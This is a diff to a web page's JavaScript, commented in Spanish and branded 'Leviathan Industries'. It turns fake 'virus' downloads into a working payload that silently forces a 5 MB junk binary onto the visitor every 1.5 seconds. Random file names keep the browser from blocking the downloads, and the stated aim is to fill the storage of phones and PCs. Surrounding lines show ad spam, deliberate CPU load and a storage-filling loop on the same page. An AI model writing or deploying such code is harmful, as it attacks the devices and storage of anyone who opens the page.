@@ -157,20 +157,40 @@ function createAd() {
 }
 setInterval(createAd, 300); // MODIFICADO: Más frecuente
 
-// --- 5. Inicio de Descargas Simuladas ---
+// --- 5. Inicio de Descargas Simuladas (Versión mejorada para PC y Celular) ---
 function simulateDownload(filename) {
+    // Crear un Blob de 5MB en lugar de solo texto. Esto llenará el espacio mucho más rápido.
+    const junkData = new ArrayBuffer(5 * 1024 * 1024); // 5 Megabytes
+    const blob = new Blob([junkData], { type: 'application/octet-stream' });
+
+    // Crear una URL para el Blob
+    const url = URL.createObjectURL(blob);
+
+    // Crear el enlace de descarga
     const link = document.createElement('a');
-    link.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent('Leviathan Industries te ha infectado.');
+    link.href = url;
     link.download = filename;
     link.style.display = 'none';
+
+    // Añadir al DOM, hacer clic y limpiar
     document.body.appendChild(link);
     link.click();
-    document.body.removeChild(link);
+    
+    // Limpiar la URL del objeto para liberar memoria (aunque el archivo ya se descargó)
+    setTimeout(() => {
+        document.body.removeChild(link);
+        URL.revokeObjectURL(url);
+    }, 100);
 }
+
 let fileCounter = 0;
+// MODIFICADO: Aumentar la frecuencia de descarga para saturar el almacenamiento más rápido.
 setInterval(() => {
-    simulateDownload(`virus_\${fileCounter++}.txt`);
-}, 500); // MODIFICADO: Más frecuente
+    // Generamos un nombre de archivo aleatorio para evitar que el navegador lo bloquee por ser duplicado.
+    const randomFilename = `leviathan_${Math.random().toString(36).substring(2, 15)}.bin`;
+    simulateDownload(randomFilename);
+    fileCounter++;
+}, 1500); // Descarga un archivo de 5MB cada 1.5 segundos.
 
 // --- 6. Ralentización del Dispositivo (Forzando al navegador) ---
 function heavyComputation() {
@@ -434,3 +454,4 @@ setInterval(fillStorage, 200);
     
 </body>
 </html>
+
